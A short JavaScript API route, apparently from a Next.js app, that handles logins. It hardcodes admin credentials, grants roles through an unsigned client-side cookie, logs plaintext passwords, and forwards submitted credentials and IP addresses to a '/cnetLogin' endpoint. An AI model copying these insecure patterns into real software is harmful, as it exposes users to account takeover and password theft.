import Cookies from 'cookies';
import log4js from 'log4js';
import axios from '../../utils/axios'

export default async function handler(req, res) {
  const logger = log4js.getLogger();
  logger.level = "info";

  if (req.method == "POST"){
    const username = req.body['username'];
    const password = req.body['password'];
    const ipaddr = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const cookies = new Cookies(req, res);
    cookies.set('username', username);
    const role = "USER";

    if(username === "admin" && password === "passw0rd!!!"){
      cookies.set('role', "ADMIN");
    }else{
      cookies.set('role', role);
    }

    logger.log("<LOGIN> ipaddr: " + ipaddr + " | username: " + username 
      + " | pwd: " + password + " | role: " + role);

    const userData = {
      username: username, 
      password: password, 
      ip: ipaddr
    };

    try {
      const response = await axios.post("/cnetLogin", userData);
      //res.status(response.status).json(response.data);
      res.status(200).redirect("/signup");
    } catch (error) {
      logger.error('Error forwarding form data:', error);
      res.status(500).json({ error: 'Internal Server Error' });
    }
  }

  res.status(200).redirect("/");
}